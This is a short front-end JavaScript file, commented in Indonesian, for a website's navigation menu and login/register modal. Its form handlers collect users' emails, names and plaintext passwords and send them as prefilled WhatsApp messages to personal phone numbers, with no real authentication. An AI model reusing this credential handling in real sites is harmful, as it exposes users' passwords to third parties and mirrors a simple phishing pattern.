// Navbar Hamburger
const hamburger = document.getElementById('hamburger');
const navMenu = document.getElementById('nav-menu');

hamburger.addEventListener('click', () => {
    navMenu.classList.toggle('active');
});

// Modal Login dan Register
const loginBtn = document.getElementById('loginBtn');
const authModal = document.getElementById('authModal');
const closeBtns = document.querySelectorAll('.close');
const showRegister = document.getElementById('showRegister');
const showLogin = document.getElementById('showLogin');
const loginForm = document.getElementById('loginForm');
const registerForm = document.getElementById('registerForm');

loginBtn.addEventListener('click', () => {
    authModal.style.display = 'block';
    loginForm.style.display = 'block';
    registerForm.style.display = 'none';
});

closeBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        authModal.style.display = 'none';
    });
});

showRegister.addEventListener('click', (e) => {
    e.preventDefault();
    loginForm.style.display = 'none';
    registerForm.style.display = 'block';
});

showLogin.addEventListener('click', (e) => {
    e.preventDefault();
    loginForm.style.display = 'block';
    registerForm.style.display = 'none';
});

// Kirim Data ke WhatsApp
document.getElementById('loginFormData').addEventListener('submit', (e) => {
    e.preventDefault();
    const email = document.getElementById('loginEmail').value;
    const password = document.getElementById('loginPassword').value;
    const message = `Login Data:\nEmail: ${email}\nPassword: ${password}`;
    window.open(`https://wa.me/6281234567890?text=${encodeURIComponent(message)}`, '_blank');
    authModal.style.display = 'none';
});

document.getElementById('registerFormData').addEventListener('submit', (e) => {
    e.preventDefault();
    const name = document.getElementById('registerName').value;
    const email = document.getElementById('registerEmail').value;
    const password = document.getElementById('registerPassword').value;
    const message = `Register Data:\nNama: ${name}\nEmail: ${email}\nPassword: ${password}`;
    window.open(`https://wa.me/6285695069740?text=${encodeURIComponent(message)}`, '_blank');
    authModal.style.display = 'none';
});